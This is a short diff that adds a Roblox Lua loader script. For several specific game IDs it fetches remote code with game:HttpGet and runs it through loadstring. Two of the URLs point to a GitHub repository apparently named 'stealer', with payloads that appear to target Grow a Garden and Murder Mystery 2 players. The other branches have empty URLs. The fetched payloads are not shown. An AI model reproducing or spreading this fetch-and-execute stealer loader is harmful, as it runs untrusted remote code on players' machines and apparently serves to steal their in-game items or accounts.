@@ -1,1 +1,11 @@
-
+if game.PlaceId == 126884695634066 then
+     loadstring(game:HttpGet(""))() -- gag1
+elseif game.GameId == 10200395747 then
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2"))()
+elseif game.PlaceId == 142823291 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-mm2"))()
+elseif game.PlaceId == 920587237 then
+    loadstring(game:HttpGet(""))() -- ame
+elseif game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
+    loadstring(game:HttpGet(""))() -- sabn
+end
